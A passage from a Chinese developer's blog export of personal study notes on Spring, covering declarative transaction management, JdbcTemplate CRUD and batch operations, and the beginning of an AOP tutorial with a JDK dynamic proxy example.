}\n   //多钱\n   @Override\n   public void addMoney() {\n       String sql = \"update account set money=money+? where username=?\";\n       jdbcTemplate.update(sql,100,\"小红\");\n   }\n}\n\n@Service\npublic class UserService {\n   //注入 dao\n   @Autowired\n   private UserDao userDao;\n   //转账的方法\n   public void accountMoney() {\n       userDao.reduceMoney();\n       userDao.addMoney();\n   }\n}\n```\n\n4、测试\n\n```java\n@Test\npublic void testTransaction() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  userService.accountMoney();\n}\n```\n\n```sql\nid\tname\tmoney\n1\t 小明\t 900\n2\t 小红\t 1100\n```\n\n上边代码正常执行没有问题，但是如果代码执行过程中出现异常，就有问题，如下模拟异常！\n\n```java\n@Service\npublic class UserService {\n    //这里执行后将会产生错误（异常），小明少100后，小红不会多100，这就不对了！！\n    private UserDao userDao;\n    //转账方法\n    public void accountMoney(){\n        userDao.reduceMoney();//小明少100\n        int x=10/0; //异常\n        userDao.addMoney(); //小红不会增加100\n    }\n}\n```\n\n```sql\nid\tname\tmoney\n1\t 小明\t 900\n2\t 小红\t 1000 #没有增加100\n```\n\n上面问题如何解决呢？ 答：使用事务进行解决 \n\n```java\n//解决上边的异常方法——【编程式事务（传统方法）】\n//转账的方法\npublic void accountMoney() {\n  try {\n    //第一步 开启事务\n\n    //第二步 进行业务操作\n    userDao.reduceMoney();\n\n    //模拟异常\n    int i = 10/0;\n\n    userDao.addMoney();\n\n    //第三步 没有发生异常，提交事务\n  }catch(Exception e) {\n    //第四步 出现异常，事务回滚\n  }\n}\n```\n\n## 事务管理\n\n- 事务添加到 JavaEE 三层结构里面的 Service 层（业务逻辑层）\n\n- 在 Spring 进行事务管理操作有两种方式\n  - 编程式事务管理\n  - 声明式事务管理（推荐使用）\n    - 基于 xml 配置文件方式\n    - 基于注解方式（推荐使用）\n\n- 在 Spring 进行声明式事务管理，底层使用 AOP 原理\n\n- Spring 事务管理 API ：提供一个接口，代表事务管理器，这个接口针对不同的框架提供不同的实现类\n\n## 注解声明式\n\n1、在 spring 配置文件配置事务管理器\n\n```xml\n<!--创建事务管理器-->\n<bean id=\"transactionManager\"\nclass=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n <!--注入数据源-->\n <property name=\"dataSource\" ref=\"dataSource\"></property>\n</bean>\n```\n\n2、在 spring 配置文件，开启事务注解,引入tx名称空间\n\n```xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xmlns:tx=\"http://www.springframework.org/schema/tx\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n       http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd \n       http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\">\n  \n</beans>\n```\n\n3、开启事务注解\n\n```xml\n<tx:annotation-driven transaction-manager=\"transactionManager\"></tx:annotation-driven>\n```\n\n4、在 service 类上面（或者 service 类里面方法上面）添加事务注解\n\n- @Transactional，这个注解添加到类上面，也可以添加方法上面\n- 如果把这个注解添加类上面，这个类里面所有的方法都添加事务\n- 如果把这个注解添加方法上面，为这个方法添加事务\n\n```java\n@Service\n@Transactional  //添加事务注解\npublic class UserService {\n    //注入 dao\n    @Autowired\n    private UserDao userDao;\n\n    //转账的方法\n    //@Transactional\n    public void accountMoney() {\n        userDao.reduceMoney();\n        int x=10/0; //异常\n        userDao.addMoney();\n    }\n}\n\n```\n\n```java\n@Test\npublic void testTransaction() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  userService.accountMoney();\n}\n```\n\n```sql\n#有异常\nid\tname\tmoney\n1\t 小明\t 1000\n2\t 小红\t 1000\n#无异常\nid\tname\tmoney\n1\t 小明\t 900\n2\t 小红\t 1100\n```\n\n添加事务注解后就不会出现小明转了钱但是小红没有收到的情况\n\n## 完全注解声明式\n\n```java\n//创建配置类，使用配置类替代xml配置文件\n@Configuration //配置类\n@ComponentScan(basePackages = \"com.jwt\") //组件扫描\n@EnableTransactionManagement //开启事务\npublic class TxConfig {\n    //创建数据库连接池\n    @Bean\n    public DruidDataSource getDruidDataSource() {\n        DruidDataSource dataSource = new DruidDataSource();\n        dataSource.setDriverClassName(\"com.mysql.jdbc.Driver\");\n        dataSource.setUrl(\"jdbc:mysql://localhost:3306/jwt\");\n        dataSource.setUsername(\"root\");\n        dataSource.setPassword(\"root\");\n        return dataSource;\n    }\n\n    //创建 JdbcTemplate 对象\n    @Bean\n    public JdbcTemplate getJdbcTemplate(DataSource dataSource) {//从IOC容器中拿到配置注入的数据源\n        //到 ioc 容器中根据类型找到 dataSource\n        JdbcTemplate jdbcTemplate = new JdbcTemplate();\n        //注入 dataSource\n        jdbcTemplate.setDataSource(dataSource);\n        return jdbcTemplate;\n    }\n\n\n    //创建事务管理器\n    @Bean\n    public DataSourceTransactionManager getDataSourceTransactionManager(DataSource dataSource) {\n        DataSourceTransactionManager transactionManager = new DataSourceTransactionManager();\n        transactionManager.setDataSource(dataSource);\n        return transactionManager;\n    }\n}\n```\n\n测试\n\n```java\n@Test\npublic void testTransaction2() {\n  AnnotationConfigApplicationContext context =\n    new AnnotationConfigApplicationContext(TxConfig.class);\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  userService.accountMoney();\n}\n```\n\n```sql\n#有异常\nid\tname\tmoney\n1\t 小明\t 1000\n2\t 小红\t 1000\n#无异常\nid\tname\tmoney\n1\t 小明\t 900\n2\t 小红\t 1100\n```\n\n## XML声明式\n\n```xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xmlns:tx=\"http://www.springframework.org/schema/tx\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n       http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\n       http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\">\n\n    <!--引入外部属性文件-->\n    <context:property-placeholder location=\"classpath:druid.properties\"/>\n    <!--配置连接池-->\n    <bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n        <property name=\"driverClassName\" value=\"${jdbc.driverClass}\"></property>\n        <property name=\"url\" value=\"${jdbc.url}\"></property>\n        <property name=\"username\" value=\"${jdbc.username}\"></property>\n        <property name=\"password\" value=\"${jdbc.password}\"></property>\n    </bean>\n    <!--创建 JdbcTemplate 对象-->\n    <bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.JdbcTemplate\">\n        <!--注入dataSource-->\n        <property name=\"dataSource\" ref=\"dataSource\"/>\n    </bean>\n    <!-- 组件扫描 -->\n    <context:component-scan base-package=\"com.jwt\"></context:component-scan>\n\n\n    <!--1、创建事务管理器-->\n    <bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n        <!--注入数据源-->\n        <property name=\"dataSource\" ref=\"dataSource\"></property>\n    </bean>\n\n    <!--2、配置通知-->\n    <tx:advice id=\"txadvice\">\n        <!--配置事务参数-->\n        <tx:attributes>\n            <!--指定哪种规则的方法上面添加事务-->\n            <tx:method name=\"accountMoney\" propagation=\"REQUIRED\"/>\n            <!--指定匹配规则上的方法添加事务-->\n            <!--<tx:method name=\"account*\"/>-->\n        </tx:attributes>\n    </tx:advice>\n\n    <!--3、配置切入点和切面-->\n    <aop:config>\n        <!--配置切入点-->\n        <aop:pointcut id=\"pt\" expression=\"execution(* com.jwt.transaction_.UserService.*(..))\"/>\n        <!--配置切面-->\n        <aop:advisor advice-ref=\"txadvice\" pointcut-ref=\"pt\"/>\n    </aop:config>\n</beans>\n```\n\n测试\n\n```java\n@Test\npublic void testTransaction3() {\n    ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"bean7.xml\");\n    UserService userService = context.getBean(\"userService\", UserService.class);\n    userService.accountMoney();\n}\n```\n\n```sql\n#有异常\nid\tname\tmoney\n1\t 小明\t 1000\n2\t 小红\t 1000\n#无异常\nid\tname\tmoney\n1\t 小明\t 900\n2\t 小红\t 1100\n```\n\n## 声明式事务参数\n\n![](https://img.jwt1399.top/img/image-20220417211523013.png)\n\n### propagation：事务传播行为\n\n多事务方法直接进行互相调用，Spring 框架事务传播行为有7种\n\n| 传播属性      | 描述                                                         |\n| ------------- | ------------------------------------------------------------ |\n| REQUIRED      | 如果有事务在运行,当前的方法就在这个事务内运行,否则就启动一个新事务,并在自己的事务内运行 |\n| REQUIRES_NEW  | 当前的方法必须启动新事务,并在它自己的事务内运行,如果有事务正在运行,应该将它挂起 |\n| SUPPORTS      | 如果有事务在运行,当前的方法就在这个事务内运行,否则它可以不运行在事务中 |\n| NOT_SUPPORTED | 当前的方法不应该运行在事务中,如果有运行的事务,将它挂起       |\n| MANDATORY     | 当前的方法必须运行在事务内部,如果没有正在运行的事务,就抛出异常 |\n| NEVER         | 当前的方法不应该运行在事务中,如果有运行的事务,就抛出异常     |\n| NESTED        | 如果有事务运行,当前的方法就应该在这个事务的嵌套事务内运行,否则,就启动一个新的事务,并在它自己的事务内运行 |\n\n![](/Users/jianjian/jwt1399.github.io/source/images/Spring-事务/image-20220417212238809.png)\n\t\n\n如上，传播级别为 REQUIRED。\n\n即：如果 add 方法本身有事务，调用 update 方法之后，update 使用当前 add 方法里面的事务。如果 add 方法本身没有事务，调用 update 方法之后，update 创建新事务\n\n如上，传播级别为REQUIRES_NEW。即：add 方法本身无论是否有事务，update都创建新的事务\n\n```java\n//配置\n@Transactional(propagation = Propagation.REQUIRED)\n```\n\n### ioslation：事务隔离级别 \n\n事务有特性成为隔离性，多事务操作之间不会产生影响。不考虑隔离性产生很多问题\n\n三个读问题：脏读、不可重复读、虚(幻)读 \n\n- 脏读：一个未提交事务读取到另一个未提交事务的数据\n- 不可重复读：一个未提交事务读取到另一提交事务修改数据  \n- 虚读：一个未提交事务读取到另一提交事务添加数据 \n\n解决：通过设置事务隔离级别，解决读问题。MYSQL默认隔离级别:可重复读\n\n|                            | 脏读     | 不可重复读 | 虚读     |\n| -------------------------- | -------- | ---------- | -------- |\n| READ_UNCOMMITTED(读未提交) | 不可解决 | 不可解决   | 不可解决 |\n| READ_COMMITTED(读已提交)   | 可解决   | 不可解决   | 不可解决 |\n| REPEATABLE_READ(可重复读)  | 可解决   | 可解决     | 不可解决 |\n| SERIALIZABLE(串行化)       | 可解决   | 可解决     | 可解决   |\n\n```java\n//配置\n@Transactional(isolation = Isolation.READ_COMMITTED)\n```\n\n### timeout：超时时间\n\n- 事务需要在一定时间内进行提交，如果不提交进行回滚\n\n- 默认值是 -1 ，设置时间以秒单位进行计算\n\n```java\n//设置\n@Transactional(timeout = 60)\n```\n\n### readOnly：是否只读\n\n- 读：查询操作，写：添加修改删除操作\n\n- readOnly 默认值 false，表示可以查询，可以添加修改删除操作\n\n- 设置 readOnly 值是 true，设置成 true 之后，只能查询\n\n```java\n//设置\n@Transactional(readOnly = false)\n```\n\n### rollbackFor：回滚\n\n设置出现哪些异常进行事务回滚\n\n```java\n//设置\n@Transactional(rollbackFor = NullPointerException.class)\n```\n\n### noRollBackFor：不回滚\n\n设置出现哪些异常不进行事务回滚\n\n```java\n//设置\n@Transactional(noRollbackFor = NullPointerException.class)\n```\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring"],"categories":["Spring"]},{"title":"Spring-JDBCTemplate","url":"/posts/4365.html","content":"\n## 前言\n\n今天开始学习我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《Spring-JDBCTemplate》，小简从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计1天更新完\n- [x] 🎯开始时间：04-15\n- [x] 🎉结束时间：04-15\n- [x] 🍀总结：按时完成，但是完全记不住，自己写还得看文档！\n\n## JdbcTemplate\n\nSpring 框架对 JDBC 进行封装，使用 JdbcTemplate 方便实现对数据库操作 \n\n## 准备工作\n\n**1、引入相关jar包**\n\n```\ndruid-1.2.9.jar\nmysql-connector-java-8.0.28.jar\nspring-jdbc-5.3.18.jar\nspring-orm-5.3.18.jar\nspring-tx-5.3.18.jar\n```\n\n**2、在spring配置文件配置数据库连接池**\n\n```xml\n<!--引入外部属性文件，需要配置context名称空间--> \n<context:property-placeholder location=\"classpath:druid.properties\"/>\n<!--配置连接池--> \n<bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n    <property name=\"driverClassName\" value=\"${jdbc.driverClass}\"></property>\n    <property name=\"url\" value=\"${jdbc.url}\"></property>\n    <property name=\"username\" value=\"${jdbc.username}\"></property>\n    <property name=\"password\" value=\"${jdbc.password}\"></property>\n</bean>\n```\n\ndruid.properties\n\n```properties\njdbc.driverClass=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/jwt\njdbc.username=root\njdbc.password=root\n```\n\n**3、配置JdbcTemplate对象，注入DataSource**\n\n```xml\n<!-- JdbcTemplate对象 -->\n<bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.JdbcTemplate\">\n   <!--注入dataSource--> \n   <property name=\"dataSource\" ref=\"dataSource\"/>\n</bean>\n```\n\n**4、创建service类，创建dao类**\n\n- 在dao中注入jdbcTemplate对象\n- 在service中注入dao对象\n\n```xml\n<!-- 组件扫描 -->\n<context:component-scan base-package=\"com.jwt\"></context:component-scan>\n```\n\n```java\n@Service\npublic class BookService {\n    //注入dao\n    @Autowired\n    private BookDao bookDao;\n}\n```\n\n```java\npublic interface BookDao {\n}\n```\n\n```java\n@Repository\npublic class BookDaoImpl implements BookDao {\n    //注入JdbcTemplate\n    @Autowired\n    private JdbcTemplate jdbcTemplate;\n}\n```\n\n## 实现添加操作\n\n1、先创建一个表\n\n```sql\nCREATE TABLE `book`(\n  id INT,\n  name VARCHAR (255),\n  status VARCHAR (255)\n)CHARACTER SET utf8 COLLATE utf8_bin ENGINE INNODB ;\n```\n\n2、创建表对应实体类\n\n```java\npublic class Book {\n    private String bookId;\n    private String bookName;\n    private String bookStatus;\n\n    public String getBookId() {\n        return bookId;\n    }\n\n    public void setBookId(String bookId) {\n        this.bookId = bookId;\n    }\n\n    public String getBookName() {\n        return bookName;\n    }\n\n    public void setBookName(String bookName) {\n        this.bookName = bookName;\n    }\n\n    public String getBookStatus() {\n        return bookStatus;\n    }\n\n    public void setBookStatus(String bookStatus) {\n        this.bookStatus = bookStatus;\n    }\n}\n```\n\n3、编写**service**和**dao** \n\n- 1.在dao中增加数据库添加方法\n- 2.在dao的实现类中实现该方法\n  - 调用JdbcTemplate对象里面update(String sql, Object... args)方法实现添加操作 \n  - 第一个参数：sql语句 \n  -  第二个参数：可变参数，设置sql语句值  \n- 3.在service中调用dao的添加方法\n\n```java\npublic interface BookDao {\n     void add(Book book);//添加的方法\n}\n```\n\n```java\n@Repository\npublic class BookDaoImpl implements BookDao {\n    //注入JdbcTemplate\n    @Autowired\n    private JdbcTemplate jdbcTemplate;\n\n    @Override\n    public void add(Book book) {\n        // 创建sql语句\n        String sql = \"INSERT INTO `book` VALUES (?, ?, ?)\";\n        // 调用方法实现\n        int update = jdbcTemplate.update(sql, book.getBookId(), book.getBookName(), book.getBookStatus());\n        System.out.println(update);\n    }\n}\n```\n\n```java\n@Service\npublic class BookService {\n    //注入dao\n    @Autowired\n    private BookDao bookDao;\n    \n    public void add(Book book) {\n        bookDao.add(book);\n    }\n}\n```\n\n4、测试\n\n```java\npublic class testJDBC {\n    @Test\n    public void testadd() {\n        ApplicationContext context =\n                new ClassPathXmlApplicationContext(\"jdbc.xml\");\n        BookService bookService = context.getBean(\"bookService\", BookService.class);\n        Book book = new Book();\n        book.setBookId(\"1\");\n        book.setBookName(\"java\");\n        book.setBookStatus(\"a\");\n        bookService.add(book);\n    }\n}\n```\n\n运行后表中就会成功增加一条数据\n\n## 实现修改操作\n\n详细请参考添加操作\n\n```java\n@Override\npublic void update(Book book) {\n  String sql = \"update book set name=?,status=? where id=?\";\n  Object[] args = {book.getBookName(), book.getBookStatus(),book.getBookId()};\n  int update = jdbcTemplate.update(sql, args);\n  System.out.println(update);\n}\n```\n\n测试\n\n```java\n@Test\npublic void testupdate() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  Book book = new Book();\n  book.setBookName(\"C++\");\n  book.setBookStatus(\"b\");\n  book.setBookId(\"1\");\n  bookService.update(book);\n}\n```\n\n## 实现添加操作\n\n```java\n@Override\npublic void delete(String id) {\n  String sql = \"delete from book where id=?\";\n  int update = jdbcTemplate.update(sql,id);\n  System.out.println(update);\n}\n```\n\n测试\n\n```java\n@Test\npublic void testdelete() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  bookService.delete(\"1\");\n}\n```\n\n## 实现查询操作\n\n### 查询返回某个值\n\n- 查询表里面有多少条记录，返回是某个值\n\n- queryForObject(String sql, Class\\<T> requiredType)\n\n  - 第一个参数：sql语句 \n\n  - 第二个参数：返回类型Class  \n\n```java\n@Override\npublic int select() {\n  String sql = \"select count(*) from book\";\n  Integer count = jdbcTemplate.queryForObject(sql, Integer.class);\n  return count;\n}\n```\n\n测试\n\n```java\n@Test\npublic void testselect() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  int select = bookService.select();\n  System.out.println(\"select = \" + select);\n}\n```\n\n### 查询返回对象\n\n- queryForObject(String sql, RowMapper\\<T> rowMapper, 0bject... args)\n  - 第一个参数：sql语句\n  - 第二个参数：RowMapper 是接口，针对返回不同类型数据，使用这个接口里面 实现类完成数据封装\n  - 第三个参数：sql 语句值\n\n```java\n//查询返回对象\n@Override\npublic Book selectObj(String id) {\n  String sql = \"select * from book where `id`=?\";\n  Book book = jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper<Book>(Book.class), id);\n  return book;\n}\n```\n\n测试\n\n```java\n@Test\npublic void testselectObj() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  Book book = bookService.selectObj(\"1\");\n  System.out.println(\"book = \" + book);\n}\n```\n\n数据库中表的字段名要和实体类Book中的字段名字一样，不然会返回null\n\n### 查询返回集合\n\n- query(String sql, RowMapper\\<T> rowMapper, 0bject... args)\n\n  - 第一个参数: sql语句\n  - 第二个参数: RowMapper 是接口，针对返回不同类型数据，使用这个接口里面实现类完成数据封装\n\n  - 第三个参数: sql 语句值\n\n```java\n@Override\npublic List<Book> selectCollection() {\n  String sql = \"select * from book\";\n  //调用方法\n  List<Book> bookList = jdbcTemplate.query(sql,new BeanPropertyRowMapper<Book>(Book.class));\n  return bookList;\n}\n```\n\n测试\n\n```java\n@Test\npublic void testselectCollection() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  List<Book> books = bookService.selectCollection();\n  System.out.println(\"books = \" + books);\n}\n```\n\n## 实现批量操作\n\n### 批量添加\n\n- batchUpdate方法\n  -  第一个参数：sql语句\t\n  - 第二个参数：List集合，添加多条记录数据\n\n```java\n@Override\npublic void batchAdd(List<Object[]> batchArgs) {\n  String sql = \"insert into book values(?,?,?)\";\n  int[] ints = jdbcTemplate.batchUpdate(sql, batchArgs);\n  System.out.println(Arrays.toString(ints));\n}\n```\n\n测试\n\n```java\n@Test\npublic void testbatchAdd() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  List<Object[]> batchArgs = new ArrayList<>();\n  Object[] o1 = {\"3\",\"java\",\"a\"};\n  Object[] o2 = {\"4\",\"c++\",\"b\"};\n  Object[] o3 = {\"5\",\"MySQL\",\"c\"};\n  batchArgs.add(o1);\n  batchArgs.add(o2);\n  batchArgs.add(o3);\n  //调用批量添加\n  bookService.batchAdd(batchArgs);\n}\n```\n\n### 批量修改\n\n```java\n@Override\npublic void batchUpdate(List<Object[]> batchArgs) {\n  String sql = \"update book set name=?,status=? where id=?\";\n  int[] ints = jdbcTemplate.batchUpdate(sql, batchArgs);\n  System.out.println(Arrays.toString(ints));\n}\n```\n\n测试\n\n```java\n@Test\npublic void testbatchUpdate() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  List<Object[]> batchArgs = new ArrayList<>();\n  Object[] o1 = {\"java2\",\"a3\",\"3\"};\n  Object[] o2 = {\"c++2\",\"b4\",\"4\"};\n  Object[] o3 = {\"MySQL2\",\"c5\",\"5\"};\n  batchArgs.add(o1);\n  batchArgs.add(o2);\n  batchArgs.add(o3);\n  bookService.batchUpdate(batchArgs);\n}\n```\n\n### 批量删除\n\n```java\n@Override\npublic void batchDelete(List<Object[]> batchArgs) {\n  String sql = \"delete from book where id=?\";\n  int[] ints = jdbcTemplate.batchUpdate(sql, batchArgs);\n  System.out.println(Arrays.toString(ints));\n}\n```\n\n测试\n\n```java\n@Test\npublic void testbatchDelete() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  List<Object[]> batchArgs = new ArrayList<>();\n  Object[] o1 = {\"3\"};\n  Object[] o2 = {\"4\"};\n  batchArgs.add(o1);\n  batchArgs.add(o2);\n  bookService.batchDelete(batchArgs);\n}\n```\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring"],"categories":["Spring"]},{"title":"Spring-AOP","url":"/posts/17849.html","content":"\n##  前言\n\n今天开始学习我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《Spring-AOP》，小简从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计2天更新完\n- [x] 🎯开始时间：04-13\n- [x] 🎉结束时间：04-13\n- [x] 🍀总结：使用很简单，一天搞定，源码部分后面再看\n\n## 概念\n\nAOP：面向切面编程，利用 AOP 可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。\n\n通俗描述：不通过修改源代码方式，在主干功能里面添加新功能\n\n## 底层原理\n\nAOP底层使用动态代理\n\n- 1、有接口情况，使用 JDK 动态代理\n  - 创建接口实现类代理对象，增强类的方法\n\n- 2、没有接口情况，使用 CGLIB 动态代理 \n  - 创建子类的代理对象，增强类的方法  \n\n## JDK动态代理\n\nJDK 动态代理，使用 Proxy 类里面的方法创建代理对象，调用 newProxyInstance 方法\n\n```java\npublic static Object newProxyInstance(ClassLoader loader,\n                                      Class<?>[] interfaces,\n                                      InvocationHandler h)\n```\n\n- 第一参数，类加载器\n- 第二参数，增强方法所在的类，这个类实现的接口，支持多个接口 \n- 第三参数，实现这个接口 InvocationHandler，创建代理对象，写增强的部分 \n\n**模拟 JDK 动态代理代码** \n\n场景：现有 add 和 update 两方法，在不改变源码的情况下，增强这两方法\n\nStep1：创建接口，定义方法\n\n```java\npublic interface UserDao {\n    public int add(int a, int b);\n    public String update(String id);\n}\n```\n\nStep2：创建接口实现类，实现方法\n\n```java\npublic class UserDaoImpl implements UserDao {\n    @Override\n    public int add(int a, int b) {\n        System.out.println(\"add方法执行了 ...\");\n        return a + b;\n    }\n    @Override\n    public String update(String id) {\n        System.out.println(\"update方法执行了 ...\");\n        return id;\n    }\n}\n```\n\nStep3: 使用 Proxy 类创建接口代理对象\n\n```java\npublic class JDKProxy {\n    public static void main(String[] args) {\n        // 创建接口实现类代理对象\n        Class[] interfaces = {UserDao.class};\n        // 注入接口实现类\n        UserDaoImpl userDao = new UserDaoImpl();\n        UserDao dao = (UserDao) Proxy.newProxyInstance(JDKProxy.class.getClassLoader(), interfaces, new UserDaoProxy(userDao));\n        int add = dao.add(1, 2);\n        System.out.println(\"add结果：\"+ add);\n        String update = dao.update(\"1\");\n        System.out.println(\"update结果：\"+ update);\n    }\n}\n// 创建代理对象代码\nclass UserDaoProxy implements InvocationHandler {\n    // 把创建的代理对象传递过来\n    // 通过有参构造传递\n    private Object obj;\n    public UserDaoProxy(Object obj) {\n        this.obj = obj;\n    }\n    // 当该对象被调用就执行invoke方法\n    // 增强逻辑编写在invoke方法中\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        // 方法之前处理\n        System.out.println(\"方法之前执行...\\n\" + method.getName() + \"传递的参数：\" + Arrays.toString(args));\n        // 被增强的方法执行\n        Object res = method.invoke(obj, args);\n        // 对不同方法进行不同增强\n        if (method.getName() == \"add\") {\n            System.out.println(\"增强add方法 ...\");\n        } else if (method.getName() == \"update\") {\n            System.out.println(\"增强update方法 ...\");\n        }\n        // 方法之后处理\n        System.out.println(\"方法之后执行...\" + obj);\n        return res;\n    }\n}\n/**\n方法之前执行...\nadd传递的参数：[1, 2]\nadd方法执行了 ...\n增强add方法 ...\n方法之后执行...com.jwt.aop.UserDaoImpl@63947c6b\nadd结果：3\n方法之前执行...\nupdate传递的参数：[1]\nupdate方法执行了 ...\n增强update方法 ...\n方法之后执行...com.jwt.aop.UserDaoImpl@63947c6b\nupdate结果：1\n**/\n```\n\n## 操作术语\n\n**连接点：**类里面哪些方法可以被增强，哪些方法就被称为连接点\n\n**切入点：**实际上被增强的方法，称为切入点\n\n**通知(增强)：**实际增强的逻辑部分称为通知(增强)，即在切入点加入的逻辑代码就称为通知(增强)，通知有多种类型\n\n- ①前置通知：在切入点之前所执行的方法\n- ②后置通知：在切入点之后所执行的方法\n- ③环绕通知： 在切入点之前之后都执行的方法\n- ④异常通知：当切入点异常时执行的方法\n- ⑤最终通知：最终一定会执行的方法\n\n**切面：**一个动作，将通知应用到切入点的过程就叫切面\n\n## AOP操作\n\nSpring 框架一般都是基于 AspectJ 实现 AOP 操作，AspectJ 是独立 AOP 框架而不是 Spring 组成部分，一般把 AspectJ 和 Spirng 框架一起使用，进行 AOP 操作\n\n基于 **AspectJ** 实现 **AOP** 操作\n\n- 1、基于 xml 配置文件实现\n\n- 2、基于注解方式实现\n\n## 准备工作\n\n1、引入**AOP**相关依赖 \n\n- 需要导入如下5个依赖包\n\n```java\nspring-aop-5.3.18.jar //（Spring自带）\nspring-aspects-5.3.18.jar //（Spring自带）\naspectjweaver.jar\naopalliance.jar\ncglib-3.3.0.jar  \n```\n\n-  AspectJ下载：[AspectJ Downloads](https://www.eclipse.org/aspectj/downloads.php)\n  - 下载后运行 aspectj-1.9.6.jar 在 lib 目录下可以找到 aspectjweaver.jar\n  - 或者直接在这下载[aspectjweaver](https://mvnrepository.com/artifact/org.aspectj/aspectjweaver/1.8.13)\n\n- aopalliance下载：[aopalliance.jar](https://sourceforge.net/projects/aopalliance/files/aopalliance/1.0/aopalliance.zip/download)，需要等待一下才会弹出下载框。\n\n- cglib下载：[cglib/cglib (github.com)](https://github.com/cglib/cglib/releases/tag/RELEASE_3_3_0)\n\n2、了解切入点表达式\n\n- 切入点表达式作用：知道对哪个类里面的哪个方法进行增强 \n\n- 语法结构：`execution([权限修饰符] [返回类型] [类全路径].[方法名称](..))`\n\n  - 权限修饰符：可以省略\n\n  - 返回类型：可使用通配符`*`，表示任意返回值\n\n  - 类全类名：类路径下的完整路径\n\n  - 方法名称()：指定哪个方法增强，()填入方法参数列表，`..`两个点表示方法中的参数\n\n```java\n//例 1：对 com..dao.BookDao 类里面的 add 